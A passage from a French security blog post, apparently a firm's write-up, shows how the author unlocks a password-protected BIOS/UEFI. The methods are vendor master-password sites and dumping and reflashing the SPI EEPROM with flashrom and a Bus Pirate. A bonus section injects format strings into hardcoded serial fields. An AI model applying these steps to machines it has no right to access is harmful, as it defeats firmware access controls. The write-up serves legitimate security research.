<div class="wp-block-image"><figure class="aligncenter size-full"><img width="275" height="183" src="https://www.acceis.fr/voy_content/uploads/2022/05/index8.png" alt="" class="wp-image-2277" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/index8.png 275w, https://www.acceis.fr/voy_content/uploads/2022/05/index8-60x40.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/index8-100x67.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/index8-200x133.png 200w" sizes="(max-width: 275px) 100vw, 275px" /></figure></div>



<p>Nous attendons une bonne heure et voici venu le temps de rallumer l’ordinateur.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="768" src="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-1024x768.jpg" alt="" class="wp-image-2278" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-1024x768.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-300x225.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-768x576.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-1536x1152.jpg 1536w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-60x45.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-100x75.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191-200x150.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_1141191.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Bien sûr l’ordinateur ne stocke pas le mot de passe BIOS dans le mémoire de la CMOS.</p>



<h3><span class="has-inline-color has-primary-color">C) Utilisez des mots de passe constructeurs</span></h3>



<p>La seconde méthode qui me vient directement à l’esprit est l’utilisation des mots de passe constructeurs.</p>



<p>En effet, les constructeurs implantent dans les UEFIs des mots de passe générique afin de pouvoir les débloquer. Certains de ces mots de passe sont en libre accès sur internet. Un site bien connu est: <a href="https://bios-pw.org/">https://bios-pw.org/</a>.</p>



<p>Le site demande le code constructeur obtenu après 3 tentatives infructueuses et nous donne les mots de passe afin de pouvoir débloquer notre BIOS. Enfin en théorie&#8230;</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="768" src="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-1024x768.jpg" alt="" class="wp-image-2279" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-1024x768.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-300x225.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-768x576.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-1536x1152.jpg 1536w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-60x45.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-100x75.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125-200x150.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114125.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Après 3 tentatives infructueuses, nous obtenons bien notre code. Nous le renseignons dans le site.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="561" height="328" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled8.png" alt="" class="wp-image-2280" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled8.png 561w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled8-300x175.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled8-60x35.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled8-100x58.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled8-200x117.png 200w" sizes="(max-width: 561px) 100vw, 561px" /></figure></div>



<p>Nous avons deux codes possibles et après les avoir essayés &#8230;</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="768" src="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-1024x768.jpg" alt="" class="wp-image-2281" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-1024x768.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-300x225.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-768x576.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-1536x1152.jpg 1536w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-60x45.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-100x75.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119-200x150.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220510_114119.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Je comprends maintenant que mes collègues ne sont pas si incompétents que cela.</p>



<h2><span class="has-inline-color has-secondary-color">3) Sortez l’artillerie lourde</span></h2>



<p>Relativement frustré, j’ai donc décidé de m’attaquer directement au matériel. Pour ce faire, j’ai cherché dans la réserve d’ACCEIS (aka <em>no man’s land</em>) le même ordinateur mais contenant un BIOS sans mot de passe. L’objectif initial est de comparer les deux UEFIs.</p>



<h3><span class="has-inline-color has-primary-color">A) Cherchez l’EEPROM contenant l’UEFI</span></h3>



<p>Avant de venir récupérer l’UEFI, il faut localiser la mémoire la contenant. J’ai la chance d’avoir à plusieurs reprise pu réaliser des opérations similaires chez ACCEIS. Je sais donc que ce genre d’informations se trouvent généralement sur une EEPROM externe.</p>



<p>L’EEPROM (<em>Electrically-Erasable Programmable Read-Only Memory</em>) est une mémoire morte électronique reprogrammable et effaçable électroniquement. Le but d’une mémoire morte est le stockage d’informations ne devant pas être perdues lorsque l&#8217;appareil qui les contient n&#8217;est plus alimenté en électricité (merci Wikipédia). L’avantage d’une EEPROM est qu’il est possible de la reprogrammer sans la retirer de l’appareil électronique la contenant (à l’inverse d’une EPROM).</p>



<p>J’ai à de nombreuses reprises chez ACCEIS, rencontrées des EEPROMs avec la forme suivante :</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="500" height="500" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1.jpg" alt="" class="wp-image-2282" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1.jpg 500w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1-300x300.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1-150x150.jpg 150w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1-60x60.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1-100x100.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1-200x200.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-1-400x400.jpg 400w" sizes="(max-width: 500px) 100vw, 500px" /></figure></div>



<p>Il en existe de forme différente, mais pour mes recherches, j’ai décidé de me concentrer sur les plus communes.</p>



<p>J’ai donc commencé un travail minutieux de recherche sur la carte mère de l’ordinateur (rappel ⇒ Aucun schéma électronique disponible sur internet).</p>



<p>Après des minutes intenses de louchage, j’ai enfin trouvé des candidats potentiels : deux puces juste à côté de la pile CMOS. Des candidats idéals jusqu’à ce que j’arrive à lire la référence&#8230;</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="518" height="641" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled.jpg" alt="" class="wp-image-2231" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled.jpg 518w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-242x300.jpg 242w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-48x60.jpg 48w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-81x100.jpg 81w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-162x200.jpg 162w" sizes="(max-width: 518px) 100vw, 518px" /></figure></div>



<p>Je n’avais jamais vu des telles références ; mon EEPROM s’est transformée en régulateur de tension. Cela risque d’être compliqué de trouver un UEFI à cet endroit, même en cherchant bien&#8230;</p>



<p>J’ai donc repris mes recherches avant de trouver sur un troisième candidat. Les références me semblent familières. Je cherche donc sur internet la Datasheet et &#8230; Bingo, une magnifique EEPROM !</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="654" height="875" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-1.jpg" alt="" class="wp-image-2233" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-1.jpg 654w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-1-224x300.jpg 224w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-1-45x60.jpg 45w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-1-75x100.jpg 75w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled2-1-149x200.jpg 149w" sizes="(max-width: 654px) 100vw, 654px" /></figure></div>



<h3><span class="has-inline-color has-primary-color">B) Lisez attentivement la datasheet</span></h3>



<p>J’ai pris l’habitude de toujours lire la datasheet. Celle-ci est relativement utile pour ne pas brûler la puce en l’alimentant en 5 volts alors qu’elle ne supporte que du 3.3 volts.</p>



<p>Je trouve rapidement la page qui m’intéresse, celle contenant les tensions ainsi que les différents protocoles de communication supportés par notre puce.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="857" height="508" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled12.png" alt="" class="wp-image-2283" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled12.png 857w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled12-300x178.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled12-768x455.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled12-60x36.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled12-100x59.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled12-200x119.png 200w" sizes="(max-width: 857px) 100vw, 857px" /></figure></div>



<p>Par chance (ou convention) notre puce supporte le SPI.</p>



<p>Le SPI (<em>Serial Peripheral Interface</em>) est un bus de données série synchrone communiquant sous le schéma de maître-esclave. Le périphérique dit maître va communiquer sur le bus de données et envoyer des commandes à un esclave. L’esclave enverra ensuite la réponse au maître.</p>



<p>Le bus SPI utilise 4 canaux différents:</p>



<ul><li><strong>CLK</strong> ⇒ Serial Clock, Horloge (généré par le maître)</li><li><strong>MOSI</strong> ⇒ Master Output, Slave Input (généré par le maître)</li><li><strong>MISO</strong> ⇒ Master Input, Slave Output (généré par l&#8217;esclave)</li><li><strong>CS</strong> ⇒ Slave Select, Actif à l&#8217;état bas (généré par le maître)</li></ul>



<p>Nous allons donc devoir trouver les pattes correspondantes dans notre datasheet. Heureusement, c’est assez simple. Un magnifique schéma nous montre ce que nous cherchons.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="845" height="780" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled13.png" alt="" class="wp-image-2284" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled13.png 845w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled13-300x277.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled13-768x709.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled13-60x55.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled13-100x92.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled13-200x185.png 200w" sizes="(max-width: 845px) 100vw, 845px" /></figure></div>



<p>Maintenant que nous avons toutes les informations nécessaires, nous pouvons nous brancher sur les pattes suivantes :</p>



<ul><li>VCC (5 ou 3.3V)</li><li>CS (Chip select)</li><li>GND (Ground)</li><li>CLK (Clock)</li><li>DI (MOSI)</li><li>DO (MISO)</li></ul>



<h3><span class="has-inline-color has-primary-color">C) Réalisez le branchement et dumpez</span></h3>



<p>Au vu de la taille relativement petite de l’EEPROM (8x6mm), de la taille encore plus petite des pattes (1mm) et de mon Parkinson grandissant, j’ai décidé d’utiliser des sondes.</p>



<p>Les sondes en question sont des PCBites.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="675" height="632" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled14.jpg" alt="" class="wp-image-2285" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled14.jpg 675w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled14-300x281.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled14-60x56.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled14-100x94.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled14-200x187.jpg 200w" sizes="(max-width: 675px) 100vw, 675px" /></figure></div>



<p>Sur un socle en métal, les sondes viennent se fixer via des aimants. Ces sondes ne sont rien d’autre qu’une pointe très fine reliée à un fil. La structure en acier permet de faire tenir la pointe sur les pattes de notre puce.</p>



<p>Il est ainsi relativement aisé de réaliser le montage suivant :</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="722" height="965" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled15.jpg" alt="" class="wp-image-2286" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled15.jpg 722w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled15-224x300.jpg 224w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled15-45x60.jpg 45w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled15-75x100.jpg 75w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled15-150x200.jpg 150w" sizes="(max-width: 722px) 100vw, 722px" /></figure></div>



<p>Bien ! Nous avons maintenant des sondes sur les pattes de notre EEPROM, mais il faut pouvoir brancher ces fils quelque part afin de communiquer en SPI.</p>



<p>C’est maintenant qu’entre en jeu le bus pirate (un raspberry fait aussi l’affaire).</p>



<p>Le Bus Pirate est un dispositif d&#8217;interface de bus universel conçu pour la programmation, le débogage et l&#8217;analyse des microcontrôleurs. Il permet notamment la communication en SPI.</p>



<p>Tel un jeu d’enfant, nous faisons correspondre les fils avec les inscriptions au dos du bus pirate :</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="600" height="258" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled16.jpg" alt="" class="wp-image-2287" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled16.jpg 600w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled16-300x129.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled16-60x26.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled16-100x43.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled16-200x86.jpg 200w" sizes="(max-width: 600px) 100vw, 600px" /></figure></div>



<p>Ce qui donne le montage suivant sur le bus pirate :</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="766" height="1024" src="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-766x1024.jpg" alt="" class="wp-image-2288" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-766x1024.jpg 766w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-225x300.jpg 225w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-768x1026.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-1150x1536.jpg 1150w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-45x60.jpg 45w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-75x100.jpg 75w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252-150x200.jpg 150w, https://www.acceis.fr/voy_content/uploads/2022/05/IMG_20220113_154252.jpg 1497w" sizes="(max-width: 766px) 100vw, 766px" /></figure></div>



<p>Nous branchons le bus pirate à notre ordinateur et nous sommes prêts à dumper notre UEFI.</p>



<p>Comme je suis relativement fainéant et que je n’ai point envie de tout réaliser à la main, j’utilise un projet nommé <a href="https://github.com/flashrom/flashrom" target="_blank" rel="noreferrer noopener">flashrom</a>.</p>



<p>Le programme réalisera le dump via SPI sous réserve que la puce soit supportée. Une petite vérification sur le site officiel ⇒ <a href="https://www.flashrom.org/Supported_hardware"></a><a href="https://www.flashrom.org/Supported_hardware">https://www.flashrom.org/Supported_hardware</a>.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="292" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-1024x292.png" alt="" class="wp-image-2289" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-1024x292.png 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-300x86.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-768x219.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-1536x438.png 1536w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-60x17.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-100x29.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17-200x57.png 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled17.png 1837w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Champagne ! Je vais pouvoir économiser deux heures de ma vie.</p>



<p>Après avoir compilé flashrom et branché le bus pirate, il est intéressant de lancer une détection de la puce afin de savoir si nos branchements sont corrects.</p>



<p>Pour ce faire, la commande suivante suffit :</p>



<pre class="wp-block-code"><code class="">sudo ./flashrom -VVVVVVVVVVVVV -p buspirate_spi:dev=/dev/ttyACM0
</code></pre>



<figure class="wp-block-image size-large"><img width="1024" height="762" src="https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24-1024x762.jpg" alt="" class="wp-image-2290" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24-1024x762.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24-300x223.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24-768x571.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24-60x45.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24-100x74.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24-200x149.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-28-24.jpg 1367w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<p>Notre puce est bien détectée, nous pouvons lancer le dump :</p>



<pre class="wp-block-code"><code class="">sudo flashrom -VVVVVVVVVVVVV -p buspirate_spi:dev=/dev/ttyACM0 -c "W25Q64.V" -r W25Q64.eeprom
</code></pre>



<figure class="wp-block-image size-large"><img width="1024" height="520" src="https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-1024x520.png" alt="" class="wp-image-2293" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-1024x520.png 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-300x152.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-768x390.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-1536x780.png 1536w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-60x30.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-100x51.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1-200x102.png 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Capture-du2019ecran_2022-05-10_09-31-35-1.png 1906w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="380" height="35" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-3.png" alt="" class="wp-image-2294" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-3.png 380w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-3-300x28.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-3-60x6.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-3-100x9.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled-3-200x18.png 200w" sizes="(max-width: 380px) 100vw, 380px" /></figure></div>



<p>Nous voici en possession de notre UEFI.</p>



<h3><span class="has-inline-color has-primary-color">D) Injectez le nouvel UEFI</span></h3>



<p>Maintenant que nous sommes en possession d’un UEFI sans mot de passe, il nous suffit d’injecter celui-ci dans l’EEPROM de l’ordinateur verrouillé.</p>



<p>Pour ce faire, rien de plus simple, nous réalisons le même schéma que précédemment sur l’ordinateur que l’on souhaite déverrouiller.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="765" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18-1024x765.jpg" alt="" class="wp-image-2295" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18-1024x765.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18-300x224.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18-768x574.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18-60x45.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18-100x75.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18-200x149.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled18.jpg 1173w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Nous vérifions notre branchement en détectant la puce avec flashrom.</p>



<pre class="wp-block-code"><code class="">sudo ./flashrom -VVVVVVVVVVVVV -p buspirate_spi:dev=/dev/ttyACM0
</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="595" height="96" src="https://www.acceis.fr/voy_content/uploads/2022/05/aaaa.jpg" alt="" class="wp-image-2296" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/aaaa.jpg 595w, https://www.acceis.fr/voy_content/uploads/2022/05/aaaa-300x48.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/aaaa-60x10.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/aaaa-100x16.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/aaaa-200x32.jpg 200w" sizes="(max-width: 595px) 100vw, 595px" /></figure></div>



<p>Enfin nous pouvons uploader l’UEFI précédemment récupéré sur le nouvel ordinateur en utilisant l’option <code>-w</code> (write).</p>



<pre class="wp-block-code"><code class="">sudo flashrom -VVVVVVVVVVVVV -p buspirate_spi:dev=/dev/ttyACM0 -c "W25Q64.V" -w W25Q64.eeprom
</code></pre>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="501" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-1024x501.png" alt="" class="wp-image-2319" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-1024x501.png 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-300x147.png 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-768x375.png 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-1536x751.png 1536w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-60x29.png 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-100x49.png 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1-200x98.png 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled20-1.png 1919w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Comme nous pouvons l’observer sur l’image, notre UEFI a passé le statut VERIFIED, ce qui signifie qu’il a correctement été injecté.</p>



<p>Il ne reste plus qu’à démarrer, puis aller dans le BIOS et &#8230;</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="703" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21-1024x703.jpg" alt="" class="wp-image-2298" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21-1024x703.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21-300x206.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21-768x527.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21-60x41.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21-100x69.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21-200x137.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled21.jpg 1312w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Nous venons de débloquer notre BIOS.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="338" src="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-1024x338.jpg" alt="" class="wp-image-2299" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-1024x338.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-300x99.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-768x254.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-1536x508.jpg 1536w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-60x20.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-100x33.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22-200x66.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/Untitled22.jpg 1828w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Comme vous pouvez le voir, le<em> serial number</em> est identique sur les deux ordinateurs, ce qui veut dire que ces valeurs sont hardcodées dans notre UEFI et que nous pouvons potentiellement les modifier.</p>



<h2><span class="has-inline-color has-secondary-color">Bonus: Modifiez les références de votre ordinateur</span></h2>



<p>Après de longues heures (hum hum) de recherche, j’ai réussi à trouver dans notre UEFI des valeurs hardcodées. Il serait quand même gênant qu’un utilisateur les modifie.</p>



<p>Rien de plus simple, il suffit d’ouvrir notre dump avec Hexeditor, de trouver les valeurs que nous souhaitons modifier et de les remplacer.</p>



<p>On sauvegarde, on réalise les branchements puis on injecte.</p>



<p>Nous nous rendons maintenant dans notre BIOS et les valeurs que nous avons modifiées se trouvent bien à l’endroit souhaité.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img width="480" height="360" src="https://www.acceis.fr/voy_content/uploads/2022/05/23.jpg" alt="" class="wp-image-2303" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/23.jpg 480w, https://www.acceis.fr/voy_content/uploads/2022/05/23-300x225.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/23-60x45.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/23-100x75.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/23-200x150.jpg 200w" sizes="(max-width: 480px) 100vw, 480px" /></figure></div>



<p>Le plus intéressant est la répercussion dans Windows des modifications de notre UEFI, il est par exemple possible de modifier nos valeurs par des <em>formats strings</em>.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="681" src="https://www.acceis.fr/voy_content/uploads/2022/05/24-1024x681.jpg" alt="" class="wp-image-2304" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/24-1024x681.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/24-300x199.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/24-768x510.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/24-60x40.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/24-100x66.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/24-200x133.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/24.jpg 1163w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<p>Nous les retrouvons bien dans Windows, ouvrant ainsi la possibilité à une multitude d’attaques.</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><img width="1024" height="750" src="https://www.acceis.fr/voy_content/uploads/2022/05/25-1024x750.jpg" alt="" class="wp-image-2307" srcset="https://www.acceis.fr/voy_content/uploads/2022/05/25-1024x750.jpg 1024w, https://www.acceis.fr/voy_content/uploads/2022/05/25-300x220.jpg 300w, https://www.acceis.fr/voy_content/uploads/2022/05/25-768x563.jpg 768w, https://www.acceis.fr/voy_content/uploads/2022/05/25-60x44.jpg 60w, https://www.acceis.fr/voy_content/uploads/2022/05/25-100x73.jpg 100w, https://www.acceis.fr/voy_content/uploads/2022/05/25-200x146.jpg 200w, https://www.acceis.fr/voy_content/uploads/2022/05/25.jpg 1155w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure></div>



<h2><span class="has-inline-color has-secondary-color">Conclusion</span></h2>



